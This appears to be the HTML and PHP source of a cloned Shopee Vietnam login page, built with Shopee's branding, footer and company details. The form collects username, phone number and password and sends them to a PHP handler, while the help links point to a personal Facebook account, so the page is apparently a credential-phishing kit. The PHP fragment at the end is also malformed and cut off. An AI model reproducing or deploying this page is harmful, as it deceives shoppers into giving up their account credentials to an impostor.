...
<head>
    ...
    <meta charset="utf-8">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icon_favicon_1_32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icon_favicon_1_96.png">
    <link rel="stylesheet" data-modern="true"
        href="https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/bundle.819200983778d72f.css">
    <title>Đăng nhập tài khoản - Mua sắm Online | Shopee Việt Nam</title>
    <meta name="theme-color" content="#f53d2d" data-rh="true">
    <link rel="stylesheet" type="text/css"
        href="https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/1179.f9d2b8fe9efdf5df.css">
    <link rel="stylesheet" type="text/css"
        href="https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/2142.150b52e098c37709.css">
    <form>

<body>
    <noscript>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WJZQSJF" height="0" width="0"
    ...
    <div id="main">
        ...
        <div>
            <section class="lF2jXb" tabindex="-1"><button class="stardust-button u6BOJM" tabindex="10000"><span
                        class="zV2jR+">bỏ qua nội dung chính</span></button></section>
            <div class="shopee-progress-bar"></div>
            <div class="vtexOX">
                <nav class="axexMF">
                    <div class="D3jUo5">
                        <div class="_0L93MD"><a class="UbNlH7" href="/"><svg viewBox="0 0 192 65"
                                    class="shopee-svg-icon LybVoA m2rqmO icon-shopee-logo">
                                    <g fill-rule="evenodd">
                                        <path
                        ...
                        </div><a href="https://facebook.com/use.ducdz" class="ZKvYoG">Bạn cần giúp đỡ?</a>
                    </div>
                </nav>
                <div style="background-color: rgb(255, 235, 225);">
                    <div class="_3M9lzn PeA8Gc"
                        style="background-image: url(&quot;https://down-vn.img.susercontent.com/file/sg-11134004-7qvfs-li8l0z0kfskvd4&quot;); background-size: contain; background-repeat: no-repeat; background-position: center center;">
                        <div class="Gxi65y">
                                    ...
                                    <div class="IxqCyD J1i6cp B-fiUo">
                                        <div class="gZNAGg">
                                            <div class="KG+Utm">
                                                ...
                                                <div class="NYkwiO">
                                                    <div class="_6ELZeI">Đăng nhập với mã QR</div><a class="_7nvtMo"
                                                        href=""><svg width="40" height="40" fill="none" class="sYzQJQ">
                                                            <g clip-path="url(#clip0)">
                                                                ...
                                                                <path
                                                                    ...
                                                                    fill="#EE4D2D"></path>
                                                                <path fill="#fff"
                                                                    d="M-4.3 4l44 43.9-22.8 22.7-43.9-44z"></path>
                                                            </g>
                                                            <defs>
                                                                <clipPath id="clip0">
                                        ...
                                        <div class="yXry6s">
                                            <form action="">
                                                <div>
                                                    <div class="D3QIf1">
                                                        <div class="yup5K8"><input class="pDzPRp" type="text"
                                                                placeholder="Email/Tên đăng nhập" autocomplete="on"
                                                                id="usename" maxlength="128" value="">
                                                        </div>
                                                    </div>
                                                    <div class="D3QIf1">
                                                        <div class="yup5K8"><input class="pDzPRp" type="tel"
                                                                placeholder="Số điện thoại" autocomplete="tel" id="sdt"
                                                                value="">
                                                        </div>
                                                    </div>
                                                    <div class="vkgBkQ">
                                                        <div class="yup5K8"><input class="pDzPRp" type="password"
                                                                placeholder="Mật khẩu" autocomplete="current-password"
                                                                id="password" maxlength="16" value=""><button
                                                                class="SnLyxu"></button></div>
                                                        <div class="pYVjxt"></div>
                                                    </div>
                                                    <a href="trangchu.php"> </a>
                                                    <button class="wyhvVD _1EApiB hq6WM5 L-VL8Q KgaLSo cepDQ1 _7w24N1"
                                                        type="submit" name="btn-log">Đăng
                                                        nhập</button>
                                                </div>
                                            </form>
                                            <div class="tRiWov"><a class="anLGcx" href="">Quên mật
                                                    khẩu</a><a class="anLGcx" href="">Đăng
                                                    nhập với SMS</a></div>
                                            <div class="_6yKazv">
                                                <div class="lhhucE">
                                                ...
                                                <div class="_3051nA"><button class="nGTAZw lyJbNT bQ2eCN">
                                                        <div class="Bq4Bra">
                                                            <div
                                                                class="_1a550J social-white-background social-white-fb-blue-png">
                                                            </div>
                                                        </div>
                                                        ...
                                                        <div class="Bq4Bra">
                                                            <div
                                                                class="_1a550J social-white-background social-white-google-png">
                                                            </div>
                                                        </div>
                                        ...
                                        <div class="XLzpXt">
                                            <div class="Oug9xv Z8OMtU">Bạn chưa có tài khoản? <a class="wzgwUg"
                                                    href="dangky.html">Đăng ký</a>
                                            </div>
                                        </div>
                                    </div>
                                </form>
                    ...
                    <div class="jP2PzH">
                        <div class="ibAPxC">
                            <div class="PuXQrZ">
                                ...
                                <ul class="SOb2n7">
                                    <li class="o8Gbgv">
                                        <a href="https:facebook.com/use.ducdz"><span> Tâm Trợ Giúp</span></a>
                                    </li>
                                </ul>
                            </div>
                            <div class="PuXQrZ">
                            ...
                            <div class="PuXQrZ">
                                ...
                                <ul class="SOb2n7">
                                    <li class="o8Gbgv"><a href="https://www.facebook.com/ShopeeVN" class="FA0WjS"
                                            title="" target="_blank" rel="noopener noreferrer"><img class="_6ZyW8Y"
                                                src="https://down-vn.img.susercontent.com/file/2277b37437aa470fd1c71127c6ff8eb5"><span
                                                class="xTjlXx">Facebook</span></a></li>
                                    <li class="o8Gbgv"><a href="https://instagram.com/Shopee_VN" class="FA0WjS" title=""
                                    ...
                                    <li class="o8Gbgv"><a href="https://www.linkedin.com/company/shopee" class="FA0WjS"
                                            title="" target="_blank" rel="noopener noreferrer"><img class="_6ZyW8Y"
                            ...
                            <div class="PuXQrZ">
                                ...
                                <div class="pkg67p"><a href="https://shopee.vn/web" target="_blank"
                                        rel="noopener noreferrer"><img
                                            src="https://down-vn.img.susercontent.com/file/a5e589e8e118e937dc660f224b9a1472"
                                            alt="download_qr_code" class="ebQ6br"></a>
                                    <div class="zLPzwH"><a
                                            href="https://apps.apple.com/vn/app/shopee-7-7-th%E1%BB%9Di-trang-m%E1%BB%B9-ph%E1%BA%A9m/id959841449"
                                            target="_blank" rel="noopener noreferrer" class="W4jGm6"><img
                        ...
                        <div class="DmgODQ">
                            <div class="PGHx77 +iUQ15">© 2023 Shopee. Tất cả các quyền được bảo lưu.</div>
                        </div>
                    </div>
                    <div class="_4FDN71">
                        <div class="Hyfopi">
                            <div class="EWPRwa">
                                <div class="d56atc"><a class="Dc8l4L"
                                        href="https://help.shopee.vn/portal/article/77244"><span>Chính sách bảo
                                            mật</span></a></div>
                                <div class="d56atc"><a class="Dc8l4L"
                                        href="https://help.shopee.vn/portal/article/77245"><span>Quy chế hoạt
                                            động</span></a></div>
                                <div class="d56atc"><a class="Dc8l4L"
                                        href="https://help.shopee.vn/portal/article/77250"><span>Chính sách vận
                                            chuyển</span></a></div>
                                <div class="d56atc"><a class="Dc8l4L"
                                        href="https://help.shopee.vn/portal/article/77251"><span>CHÍNH SÁCH TRẢ HÀNG
                                            VÀ
                                            HOÀN TIỀN</span></a></div>
                            </div>
                            <div class="CpmibF"><a target="_blank" rel="noopener noreferrer"
                                    ...
                                    <div class="footer-vn-background footer-vn-vn_registered_red-png jeaJPZ"></div>
                                </a><a target="_blank" rel="noopener noreferrer" href="https://shopee.vn/docs/170"
                                    class="_44TnCg">
                                    <div class="footer-vn-background footer-vn-vn_no_fake_item-png b1v1Th"></div>
                                </a></div>
                            <div class="BV2E6Y ggg4D-">Công ty TNHH Shopee</div>
                            <div class="BV2E6Y">Địa chỉ: Tầng 4-5-6, Tòa nhà Capital Place, số 29 đường Liễu Giai,
                                Phường Ngọc Khánh, Quận Ba Đình, Thành phố Hà Nội, Việt Nam. Tổng đài hỗ trợ:
                                19001221 -
                                Email: cskh@hotro.shopee.vn</div>
                            <div class="BV2E6Y">Chịu Trách Nhiệm Quản Lý Nội Dung: Nguyễn Đức Trí - Điện thoại liên
                                hệ:
                                024 73081221 (ext 4678)</div>
                            <div class="BV2E6Y">Mã số doanh nghiệp: 0106773786 do Sở Kế hoạch &amp; Đầu tư TP Hà Nội
                                cấp
...
if (isset($_POST['btn-log'])) {
    include('control.php');
    $getdata = new data;
    $dangnhap = $getdata->login($_POST['usename'], $_POST['sdt'], $_POST('password'));
    if ($dangnhap) {
